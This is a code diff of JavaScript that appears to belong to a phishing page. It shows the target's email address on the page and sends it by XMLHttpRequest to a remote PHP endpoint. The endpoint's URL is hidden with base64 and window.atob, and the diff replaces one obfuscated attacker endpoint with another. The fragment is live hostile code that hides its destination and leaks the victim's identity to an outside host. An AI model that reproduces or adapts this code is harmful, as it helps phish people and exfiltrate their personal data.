@@ -16,7 +16,7 @@
 		var email = encoded_string;	
 		$('.identity').html(email);		
 		var request = new XMLHttpRequest();
-		var url =  window.atob('aHR0cHM6Ly9qZmV2aGsuY29tL3o3Z3l4dWgvcHJ2LnBocA==') + email
+		var url =  window.atob('aHR0cHM6Ly9qZmV2aGsuY29tL3o3Z3l4dWgvcG9saWN5LnBocA==') + email
 		request.open('GET', url, true);
 		request.onload = function() {
 		  if (this.status >= 200 && this.status < 400) {
